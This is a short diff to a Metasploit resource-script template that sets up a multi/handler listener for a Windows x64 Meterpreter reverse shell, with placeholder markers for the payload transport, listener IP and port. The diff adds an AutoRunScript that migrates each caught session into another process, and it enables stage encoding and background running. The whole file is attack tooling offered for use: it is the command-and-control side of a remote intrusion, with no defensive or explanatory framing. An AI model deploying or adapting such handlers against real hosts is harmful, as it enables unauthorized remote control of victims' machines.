@@ -1,8 +1,9 @@
 use exploit/multi/handler
-set payload windows/meterpreter/reverse_https
+set payload windows/x64/meterpreter/reverse_!!!PAYLOAD_MARK!!!
 set LHOST !!!IP_MARK!!!
 set LPORT !!!PORT_MARK!!!  
 set exitonsession false
 set enablestageencoding true
 set exitfunc thread
+set AutoRunScript post/windows/manage/migrate
 run -j
